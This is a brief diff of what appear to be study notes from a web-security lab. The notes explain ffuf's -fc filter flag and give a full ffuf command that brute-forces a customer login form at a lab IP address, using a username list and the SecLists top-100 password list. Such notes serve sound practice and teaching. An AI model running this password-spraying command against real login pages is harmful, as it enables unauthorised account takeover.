@@ -25,4 +25,6 @@
 
 -fc argument to check for an HTTP status code other than 200.
 
+= FUZZ //worldlists content
+
     ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.54.22/customers/login -fc 200
